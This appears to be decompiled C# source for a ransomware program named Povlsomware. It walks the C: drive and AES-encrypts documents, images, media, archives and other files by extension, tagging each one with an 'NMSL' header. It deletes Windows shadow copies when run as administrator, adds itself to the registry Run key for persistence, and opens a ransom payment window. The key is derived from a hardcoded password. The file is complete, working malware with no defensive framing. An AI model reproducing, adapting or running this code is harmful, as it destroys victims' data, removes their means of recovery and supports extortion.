using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Povlsomware;

internal class Program
{
	public static int count = 0;

	public static List<string> encryptedFiles = new List<string>();

	private static readonly string password = "fatego";

	private static readonly string[] extensionsToEncrypt = new string[104]
	{
		"7z", "rar", "zip", "m3u", "m4a", "mp3", "wma", "ogg", "wav", "sqlite",
		"sqlite3", "img", "nrg", "tc", "doc", "docx", "docm", "odt", "rtf", "wpd",
		"wps", "csv", "key", "pdf", "pps", "ppt", "pptm", "pptx", "ps", "psd",
		"vcf", "xlr", "xls", "xlsx", "xlsm", "ods", "odp", "indd", "dwg", "dxf",
		"kml", "kmz", "gpx", "cad", "wmf", "txt", "3fr", "ari", "arw", "bay",
		"bmp", "cr2", "crw", "cxi", "dcr", "dng", "eip", "erf", "fff", "gif",
		"iiq", "j6i", "k25", "kdc", "mef", "mfw", "mos", "mrw", "nef", "nrw",
		"orf", "pef", "png", "raf", "raw", "rw2", "rwl", "rwz", "sr2", "srf",
		"srw", "x3f", "jpg", "jpeg", "tga", "tiff", "tif", "ai", "3g2", "3gp",
		"asf", "avi", "flv", "m4v", "mkv", "mov", "mp4", "mpg", "rm", "swf",
		"vob", "wmv", "cfg", "ts"
	};

	[STAThread]
	public static string GetPass()
	{
		return password;
	}

	private static void Main()
	{
		Attack();
		DestroyCopy();
		SetStartup();
		CreateUI();
	}

	private static void SetStartup()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey.GetValue("serverf") == null && !Application.get_ExecutablePath().Contains("rundll32.exe"))
		{
			registryKey.SetValue("serverf", "\"" + Application.get_ExecutablePath() + "\"");
		}
	}

	private static void CreateUI()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		PayM3 payM = new PayM3();
		Application.Run((Form)(object)payM);
	}

	public static void DecryptFile(string fileEncrypted, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted).Skip(4).ToArray();
		byte[] array = AES_Decrypt(bytesToBeDecrypted, bytes);
		FileStream fileStream = File.Open(fileEncrypted, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(fileEncrypted, FileMode.Append);
		fileStream2.Write(array, 0, array.Length);
		Console.WriteLine("Decrypted: " + fileEncrypted);
	}

	public static void DestroyCopy()
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		bool flag;
		using (WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent())
		{
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(ntIdentity);
			flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		if (!flag)
		{
			return;
		}
		string text = "\\\\.\\ROOT\\cimv2";
		string text2 = "Win32_ShadowCopy";
		ManagementClass val = new ManagementClass(text + ":" + text2);
		ManagementObjectEnumerator enumerator = val.GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				val2.Delete();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void EncryptFile(string fileUnencrypted)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytesToBeEncrypted = File.ReadAllBytes(fileUnencrypted);
		byte[] array = AES_Encrypt(bytesToBeEncrypted, bytes);
		FileStream fileStream = File.Open(fileUnencrypted, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(fileUnencrypted, FileMode.Append);
		if (fileStream2.CanWrite)
		{
			byte[] bytes2 = Encoding.UTF8.GetBytes("NMSL");
			fileStream2.Write(bytes2, 0, bytes2.Length);
			fileStream2.Write(array, 0, array.Length);
			Console.WriteLine("Encrypted: " + fileUnencrypted);
			count++;
			encryptedFiles.Add(fileUnencrypted);
		}
	}

	public static void Attack()
	{
		string targetDirectory = "C:\\";
		ProcessDirectory(targetDirectory, 1, "");
	}

	public static void UndoAttack(string decryption_password)
	{
		string targetDirectory = "C:\\";
		ProcessDirectory(targetDirectory, 0, decryption_password);
	}

	public static void ProcessDirectory(string targetDirectory, int action, string password)
	{
		IEnumerable<string> enumerable = from file in Directory.EnumerateFiles(targetDirectory, "*.*")
			where extensionsToEncrypt.Any((string x) => file.EndsWith(x, StringComparison.OrdinalIgnoreCase))
			select file;
		foreach (string item in enumerable)
		{
			ProcessFile(item, action, password);
		}
		string[] directories = Directory.GetDirectories(targetDirectory);
		string[] array = directories;
		foreach (string text in array)
		{
			try
			{
				if (!text.Contains("All Users\\Microsoft\\") && !text.Contains("$Recycle.Bin") && !text.Contains("C:\\Windows"))
				{
					ProcessDirectory(text, action, password);
				}
			}
			catch
			{
			}
		}
	}

	public static bool IsMarked(string fileName)
	{
		byte[] bytes = Encoding.ASCII.GetBytes("NMSL");
		byte[] second = File.ReadAllBytes(fileName).Take(4).ToArray();
		if (bytes.SequenceEqual(second))
		{
			count++;
			encryptedFiles.Add(fileName);
			return true;
		}
		return false;
	}

	public static void ProcessFile(string fileName, int action, string password)
	{
		if (action == 1 && !IsMarked(fileName))
		{
			try
			{
				EncryptFile(fileName);
				return;
			}
			catch
			{
				return;
			}
		}
		if (action == 0 && IsMarked(fileName))
		{
			try
			{
				DecryptFile(fileName, password);
			}
			catch
			{
			}
		}
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}
}
